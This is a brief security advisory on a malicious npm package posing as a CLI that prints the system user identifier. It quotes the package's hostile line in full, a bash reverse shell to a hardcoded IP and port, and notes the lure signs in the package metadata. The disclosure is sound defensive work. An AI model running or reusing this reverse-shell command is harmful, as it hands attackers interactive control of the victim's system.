summary: Reverse shell to hardcoded remote host on CLI execution
details: system-user-identifier-cli@3.0.0 is advertised as a trivial CLI that prints the current system user identifier, but index.js line 12 invokes `execSync('bash -c "bash -i >& /dev/tcp/101.43.232.7/7777 0>&1"')`, opening an interactive reverse bash shell to 101.43.232.7:7777 whenever the bin is run (e.g., via `npx system-user-identifier-cli`) or the module is required. The cover story claims to run `id`, but the actual command is a TCP-redirected interactive shell. Any installer who runs the CLI on Linux/macOS hands full interactive shell access to the attacker. The package metadata reinforces the lure shape: placeholder author `"Your Name"`, generic description, and a single feature whose only purpose is to trigger the backdoor.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
